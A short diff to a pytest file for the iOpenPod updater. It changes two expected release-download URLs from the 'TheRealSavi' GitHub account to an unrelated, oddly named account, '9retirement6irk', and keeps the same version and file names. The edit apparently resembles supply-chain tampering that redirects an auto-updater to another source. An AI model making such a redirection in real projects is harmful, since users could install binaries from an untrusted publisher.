@@ -74,7 +74,7 @@ def test_authenticates_exact_release_and_derives_download_destination() -> None:
     asset = release.asset("windows-x86_64")
     assert (
         asset.url
-        == "https://github.com/TheRealSavi/iOpenPod/releases/download/v2.0.2/iOpenPod-2.0.2-Windows-AMD64.zip"
+        == "https://github.com/9retirement6irk/iOpenPod/releases/download/v2.0.2/iOpenPod-2.0.2-Windows-AMD64.zip"
     )
     assert asset.executable_sha256 == "b" * 64
     with pytest.raises(ValueError, match="no supported download"):
@@ -113,7 +113,7 @@ def test_signed_protocol_selects_exact_current_or_legacy_archive(
     assert asset.updater_protocol == protocol
     assert asset.filename == f"iOpenPod-2.0.2-{suffix}"
     assert asset.url == (
-        f"https://github.com/TheRealSavi/iOpenPod/releases/download/v2.0.2/"
+        f"https://github.com/9retirement6irk/iOpenPod/releases/download/v2.0.2/"
         f"iOpenPod-2.0.2-{suffix}"
     )
 
